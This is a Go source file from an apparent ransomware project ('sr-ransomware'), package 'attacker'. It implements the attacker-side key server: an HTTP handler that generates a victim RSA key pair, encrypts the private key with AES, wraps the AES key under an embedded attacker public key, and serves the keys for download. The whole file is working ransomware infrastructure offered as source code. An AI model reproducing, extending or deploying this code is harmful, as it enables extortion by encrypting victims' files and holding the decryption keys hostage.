package attacker

import (
    "os"
    "unsafe"
    "runtime"
    "net/http"
    "io/ioutil"
    "crypto/aes"
    "crypto/rsa"
    "crypto/sha1"
    "crypto/rand"
    "crypto/cipher"
    "path/filepath"
    "encoding/hex"
    "encoding/binary"

    "github.com/sug0/sr-ransomware/go/errors"
    "github.com/sug0/sr-ransomware/go/crypto/util"
)

//go:generate go run generate/key.go

type Oracle struct {
    key  *rsa.PublicKey
    path string
}

type Keys struct {
    Public []byte
    Secret []byte
}

func NewOracle() *Oracle {
    path := os.Getenv("FLUPATH")
    if path != "" {
        return NewOracleWithPath(path)
    }
    if runtime.GOOS == "windows" {
        return NewOracleWithPath(os.Getenv("TMP"))
    }
    return NewOracleWithPath("/tmp")
}

func NewOracleWithPath(path string) *Oracle {
    pk, _ := util.ImportDERPublicKeyRSA(oraclePublicKey)
    return &Oracle{key: pk, path: filepath.Clean(path)}
}

func (o *Oracle) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    keys, err := o.GenerateAndStoreKeys()
    if err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
        return
    }

    var size int64
    w.Header().Set("Content-Disposition", `attachment; filename="keys.bin"`)

    size = int64(len(keys.Public))
    binary.Write(w, binary.BigEndian, &size)
    w.Write(keys.Public)

    size = int64(len(keys.Secret))
    binary.Write(w, binary.BigEndian, &size)
    w.Write(keys.Secret)
}

func (o *Oracle) GenerateAndStoreKeys() (*Keys, error) {
    // generate the keys
    sk, err := util.GenerateKeyRSA(rsaKeyBits)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to generate RSA secret key", err)
    }
    aesIVKey, err := util.GenerateIVandKeyAES()
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to generate AES", err)
    }

    // export public key
    pkData, err := util.ExportDERPublicKeyRSA(&sk.PublicKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to marshal RSA public key", err)
    }

    // export and encrypt secret key
    skData, err := util.ExportDERSecretKeyRSA(sk)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to marshal RSA secret key", err)
    }
    skData = util.Pad(skData, aes.BlockSize)

    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
    aesCiph := cipher.NewCTR(aesBlock, aesIVKey[:16])

    aesCiph.XORKeyStream(skData, skData)

    // encrypt aes key and nonce
    aesEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, o.key, aesIVKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to encrypt AES key", err)
    }

    // calc hash digest of public key
    var hexdigest [2*sha1.Size]byte
    digest := sha1.Sum(pkData)

    hex.Encode(hexdigest[:], digest[:])
    d := hexdigest[:]
    ds := (*string)(unsafe.Pointer(&d))

    // write aes key
    err = ioutil.WriteFile(filepath.Join(o.path, *ds), aesEncrypted, 0644)

    if err != nil {
        return nil, errors.Wrap(pkg, "failed to encrypt AES key", err)
    }
    return &Keys{pkData, skData}, nil
}
